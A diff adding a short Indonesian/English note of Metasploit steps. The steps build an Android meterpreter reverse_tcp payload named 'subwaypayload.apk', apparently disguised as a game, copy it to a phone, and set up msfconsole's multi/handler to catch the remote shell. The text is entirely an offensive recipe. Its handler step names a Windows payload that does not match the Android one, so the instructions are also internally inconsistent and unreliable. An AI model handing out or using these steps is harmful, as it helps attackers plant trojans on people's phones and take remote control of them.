@@ -1,0 +1,10 @@
+1. msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.13(lokal pc ip) LPORT=4848(bebas)
+-o /root/Desktop/subwaypayload.apk(direktori+nama&tipefile)
+
+2. copy file apk ke android
+3. msfconsole
+4. use exploit/multi/handler
+5. set LHOST 192.168.1.13(lokal pc ip)
+6. set payload windows/meterpreter/reverse_tcp
+7. set LPORT 4848(lokal port, bebas)
+8. result
